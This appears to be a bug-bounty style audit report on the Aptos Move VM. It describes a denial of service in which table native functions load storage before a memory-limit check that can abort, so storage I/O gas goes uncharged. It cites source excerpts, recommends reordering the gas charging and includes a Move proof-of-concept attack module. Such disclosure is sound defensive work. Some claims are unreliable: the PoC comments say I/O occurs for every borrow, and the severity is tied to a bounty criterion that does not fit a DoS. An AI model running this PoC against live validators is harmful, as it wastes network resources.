# Audit Report

## Title
Resource Exhaustion DoS via Memory Limit Bypass in Storage Operations

## Summary
Attackers can craft transactions that deliberately hit the `MEMORY_LIMIT_EXCEEDED` error to force validators to perform expensive storage I/O operations without paying the corresponding gas costs. When memory tracking fails after storage loads but before storage gas is charged, validators waste computational and I/O resources processing doomed-to-fail transactions.

## Finding Description

The vulnerability exists in the execution order of native table operations where memory limit checks occur between gas charging phases, specifically after expensive storage operations have been performed but before their gas costs are charged. [1](#0-0) 

When `feature_version >= 3`, the `use_heap_memory()` function enforces a memory quota of 10,000,000 abstract value size units. [2](#0-1) 

The critical issue occurs in table native functions where the execution order is: [3](#0-2) 

The problematic sequence:
1. **Storage I/O performed** (lines 474-475): `get_or_create_global_value()` loads the value from storage - expensive operation
2. **Memory usage calculated** (lines 476-486): Heap size computed from loaded value
3. **Key cost charged** (line 498): Only key serialization gas charged
4. **Memory tracking** (line 500): `use_heap_memory()` called - **CAN FAIL HERE with MEMORY_LIMIT_EXCEEDED**
5. **Load cost charging** (line 502): Storage I/O gas - **NEVER REACHED if step 4 fails**

When `memory_limit_exceeded_as_miscellaneous_error` is enabled (gas_feature_version >= RELEASE_V1_38), these failed transactions are kept in blocks: [4](#0-3) [5](#0-4) 

The transaction status becomes `Keep(MiscellaneousError)`: [6](#0-5) 

**Attack Path:**
1. Attacker creates tables and stores large values (deeply nested structures, large vectors)
2. Attacker submits transactions that load multiple large values via `table::borrow()`, `table::add()`, or similar operations
3. Each table operation triggers storage I/O (expensive) before memory tracking
4. Memory limit is hit during tracking phase
5. Transaction fails with MEMORY_LIMIT_EXCEEDED
6. Validator has already performed storage I/O operations
7. Storage I/O gas costs are NOT charged (code after line 500 never executes)
8. Transaction is kept in block, minimal gas charged (intrinsic + key serialization only)
9. Attacker can spam such transactions repeatedly

## Impact Explanation

**Medium Severity** - This meets the bug bounty criteria for "State inconsistencies requiring intervention" and causes validator resource exhaustion:

- **Validator Performance Degradation**: Validators waste storage I/O bandwidth and CPU processing doomed transactions
- **Disproportionate Resource Consumption**: Storage I/O costs (302,385 base + 151 per byte) [7](#0-6)  are NOT charged when memory limit is hit, but the I/O operation has already been performed
- **Mempool Pollution**: Failed transactions consume block space
- **Economic Attack Surface**: Attackers pay minimal gas (intrinsic + key costs) while forcing expensive storage operations

The vulnerability breaks the **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits" - storage operations are performed without corresponding gas charges.

## Likelihood Explanation

**High Likelihood**:
- Attack requires no special privileges - any user can submit transactions
- Table operations are common in Aptos applications
- Memory limit (10M abstract value size) is easily reachable with deeply nested structures or large vectors (confirmed by test cases) [8](#0-7) 
- Feature flag is enabled in production (gas_feature_version >= RELEASE_V1_38)
- Attacker can prepare large values in advance and repeatedly trigger the vulnerability

## Recommendation

**Fix the execution order** to charge storage I/O gas BEFORE memory tracking that can fail:

```rust
// In table native functions (borrow_box, add_box, etc.)
// BEFORE the current implementation:

// 1. First charge ALL gas costs upfront
context.charge(key_cost)?;
charge_load_cost(context, loaded)?;  // Move this BEFORE memory tracking

// 2. Then perform memory tracking (which can fail)
if let Some(amount) = mem_usage {
    context.use_heap_memory(amount)?;
}
```

**Alternative approach**: Check memory limits BEFORE performing expensive storage operations by estimating memory requirements from metadata.

**Defense in depth**: Add mempool filtering to detect and rate-limit transactions that repeatedly hit memory limits.

## Proof of Concept

```move
// File: memory_dos_attack.move
module attacker::memory_dos {
    use std::table::{Self, Table};
    use std::vector;

    struct LargeValue has store {
        data: vector<vector<vector<u8>>>,
    }

    struct AttackResource has key {
        table: Table<u64, LargeValue>,
    }

    // Setup: Attacker stores large values in table
    public entry fun setup(account: &signer) {
        let table = table::new<u64, LargeValue>();
        
        // Create deeply nested large values
        let i = 0;
        while (i < 10) {
            let data = vector::empty();
            let j = 0;
            while (j < 1000) {
                let inner = vector::empty();
                let k = 0;
                while (k < 100) {
                    vector::push_back(&mut inner, b"AAAAAAAAAAAAAAAA");
                    k = k + 1;
                };
                vector::push_back(&mut data, inner);
                j = j + 1;
            };
            
            table::add(&mut table, i, LargeValue { data });
            i = i + 1;
        };
        
        move_to(account, AttackResource { table });
    }

    // Attack: Load many large values to hit memory limit
    // Validator performs storage I/O but gas for loads is not charged
    public entry fun attack(attacker_addr: address) acquires AttackResource {
        let resource = borrow_global_mut<AttackResource>(attacker_addr);
        
        // Load multiple large values - each triggers storage I/O
        // Memory limit will be hit before all loads complete
        // Storage I/O gas NOT charged when memory limit hit
        let _val0 = table::borrow(&resource.table, 0);
        let _val1 = table::borrow(&resource.table, 1);
        let _val2 = table::borrow(&resource.table, 2);
        let _val3 = table::borrow(&resource.table, 3);
        let _val4 = table::borrow(&resource.table, 4);
        // Memory limit exceeded here - validator did I/O for all loads
        // but storage gas only charged for completed operations
    }
}
```

**Expected Result**: Transaction fails with `MEMORY_LIMIT_EXCEEDED`, kept in block, but storage I/O gas costs for all `table::borrow()` operations are not fully charged. Attacker can repeatedly submit such transactions to waste validator storage I/O resources.

## Notes

This vulnerability is specific to the interaction between memory tracking enforcement and the multi-phase gas charging in native functions. The root cause is that expensive operations (storage I/O) are performed before their corresponding gas charges, allowing the memory limit check to abort execution after resources have been consumed but before payment is collected. This creates an economic asymmetry that can be exploited for resource exhaustion attacks.

### Citations

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L48-63)
```rust
    fn use_heap_memory(&mut self, amount: AbstractValueSize) -> PartialVMResult<()> {
        if self.feature_version >= 3 {
            match self.remaining_memory_quota.checked_sub(amount) {
                Some(remaining_quota) => {
                    self.remaining_memory_quota = remaining_quota;
                    Ok(())
                },
                None => {
                    self.remaining_memory_quota = 0.into();
                    Err(PartialVMError::new(StatusCode::MEMORY_LIMIT_EXCEEDED))
                },
            }
        } else {
            Ok(())
        }
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L89-104)
```rust
            storage_io_per_state_slot_read: InternalGasPerArg,
            { 0..=9 => "load_data.base", 10.. => "storage_io_per_state_slot_read"},
            // At the current mainnet scale, we should assume most levels of the (hexary) JMT nodes
            // in cache, hence target charging 1-2 4k-sized pages for each read. Notice the cost
            // of seeking for the leaf node is covered by the first page of the "value size fee"
            // (storage_io_per_state_byte_read) defined below.
            302_385,
        ],
        [
            storage_io_per_state_byte_read: InternalGasPerByte,
            { 0..=9 => "load_data.per_byte", 10.. => "storage_io_per_state_byte_read"},
            // Notice in the latest IoPricing, bytes are charged at 4k intervals (even the smallest
            // read will be charged for 4KB) to reflect the assumption that every roughly 4k bytes
            // might require a separate random IO upon the FS.
            151,
        ],
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L142-142)
```rust
        [memory_quota: AbstractValueSize, { 1.. => "memory_quota" }, 10_000_000],
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L474-502)
```rust
    let (gv, loaded) =
        table.get_or_create_global_value(&function_value_extension, table_context, key_bytes)?;
    let mem_usage = if !fix_memory_double_counting || loaded.is_some() {
        gv.view()
            .map(|val| {
                abs_val_gas_params
                    .abstract_heap_size(&val, gas_feature_version)
                    .map(u64::from)
            })
            .transpose()?
    } else {
        None
    };

    let res = match gv.borrow_global() {
        Ok(ref_val) => Ok(smallvec![ref_val]),
        Err(_) => Err(SafeNativeError::Abort {
            abort_code: NOT_FOUND,
        }),
    };

    drop(table_data);

    // TODO(Gas): Figure out a way to charge this earlier.
    context.charge(key_cost)?;
    if let Some(amount) = mem_usage {
        context.use_heap_memory(amount)?;
    }
    charge_load_cost(context, loaded)?;
```

**File:** third_party/move/move-core/types/src/vm_status.rs (L243-254)
```rust
            VMStatus::ExecutionFailure {
                status_code: StatusCode::MEMORY_LIMIT_EXCEEDED,
                ..
            } if memory_limit_exceeded_as_miscellaneous_error => {
                Ok(KeptVMStatus::MiscellaneousError)
            },
            VMStatus::Error {
                status_code: StatusCode::MEMORY_LIMIT_EXCEEDED,
                ..
            } if memory_limit_exceeded_as_miscellaneous_error => {
                Ok(KeptVMStatus::MiscellaneousError)
            },
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L596-600)
```rust
        let txn_status = TransactionStatus::from_vm_status(
            error_vm_status.clone(),
            self.features(),
            self.gas_feature_version() >= RELEASE_V1_38,
        );
```

**File:** types/src/transaction/mod.rs (L1634-1636)
```rust
                KeptVMStatus::MiscellaneousError => {
                    Self::Keep(ExecutionStatus::MiscellaneousError(Some(status_code)))
                },
```

**File:** aptos-move/e2e-move-tests/src/tests/memory_quota.rs (L92-106)
```rust
    // Forward 2 hours to activate TimedFeatureFlag::FixMemoryUsageTracking
    // Now attempting to load the whole table shall result in an execution failure (memory limit hit)
    h.new_epoch();
    let result = h.run_entry_function(
        &acc,
        str::parse("0xbeef::very_nested_structure::read_all").unwrap(),
        vec![],
        vec![],
    );
    assert!(matches!(
        result,
        TransactionStatus::Keep(ExecutionStatus::MiscellaneousError(Some(
            StatusCode::MEMORY_LIMIT_EXCEEDED
        )))
    ));
```
